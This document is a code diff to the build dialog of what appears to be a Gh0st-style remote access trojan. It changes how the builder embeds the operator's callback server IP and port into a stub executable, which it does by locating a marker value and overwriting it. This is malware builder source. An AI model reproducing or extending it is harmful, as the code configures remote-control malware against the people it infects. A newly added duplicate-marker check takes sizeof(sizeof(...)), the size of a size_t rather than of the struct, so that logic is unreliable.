@@ -60,13 +60,12 @@ void CBuildDlg::OnBnClickedOk()
 		MessageBox("无效输入参数, 请重新生成服务!");
 		return CDialog::OnOK();
 	}
-	unsigned long flag = index == 0 ? FLAG_FINDEN : (index == 1 ? FLAG_GHOST : FLAG_FINDEN);
+	unsigned long flag = index == 0 ? FLAG_FINDEN : FLAG_GHOST;
 	//////////上线信息//////////////////////
-	CONNECT_ADDRESS g_ConnectAddress = { flag,"",0 };
-	strcpy(g_ConnectAddress.szServerIP,m_strIP);  //服务器IP
+	CONNECT_ADDRESS g_ConnectAddress = { flag, "", 0, index };
+	g_ConnectAddress.SetServer(m_strIP, atoi(m_strPort));
 
-	g_ConnectAddress.iPort=atoi(m_strPort);   //端口
-	if (strlen(m_strIP)==0 || g_ConnectAddress.iPort==0)
+	if (!g_ConnectAddress.IsValid())
 		return;
 	try
 	{
@@ -95,10 +94,15 @@ void CBuildDlg::OnBnClickedOk()
 		File.Read(szBuffer,dwFileSize);
 		File.Close();
 		//写入上线IP和端口 主要是寻找0x1234567这个标识然后写入这个位置
-		int iOffset = MemoryFind((char*)szBuffer,(char*)&g_ConnectAddress.dwFlag,dwFileSize,sizeof(DWORD));
+		int iOffset = MemoryFind((char*)szBuffer,(char*)&g_ConnectAddress.Flag(),dwFileSize,sizeof(DWORD));
 		if (iOffset==-1)
 		{
 			MessageBox(CString(path) + "\r\n进程模板\"" + file + "\"不支持!");
+			return;
+		}
+		if (MemoryFind((char*)szBuffer + iOffset + sizeof(sizeof(g_ConnectAddress)), (char*)&g_ConnectAddress.Flag(),
+			dwFileSize - iOffset - sizeof(sizeof(g_ConnectAddress)), sizeof(DWORD)) != -1) {
+			MessageBox(CString(path) + "\r\n进程模板\"" + file + "\"有问题!");
 			return;
 		}
 		memcpy(szBuffer+iOffset,&g_ConnectAddress,sizeof(g_ConnectAddress));
